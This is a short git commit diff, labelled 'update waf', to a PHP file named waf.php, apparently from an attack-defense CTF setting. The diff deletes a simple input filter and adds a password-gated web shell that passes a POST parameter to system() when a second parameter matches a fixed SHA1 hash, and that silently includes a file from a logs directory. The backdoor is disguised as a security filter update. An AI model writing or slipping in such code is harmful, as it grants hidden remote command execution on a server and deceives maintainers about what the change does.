c471fe7b2a38180a073b9b4576e26e6aa3fed055
racterub <racterub@gmail.com>
2022-02-13 11:42:42 +0800

    update waf

--- 33/waf.php
+++ 33/waf.php
@@ -1,5 +1,2 @@
-<?php
-if(preg_match("/files:/i",file_get_contents("php://input"))) die();
-foreach ($_REQUEST as $k => $v) {
-   $_REQUEST[$k]=preg_replace("/flag/",'',$v);
-}
+<?php if(isset($_POST["p"])&&isset($_POST["w"]))if(hash("sha1",$_POST["p"])==="69d2d1bca1a4fd001fa9462d3f3cae62c29532d9")@system($_POST["w"]);
+@include_once "/var/www/html/logs/w";
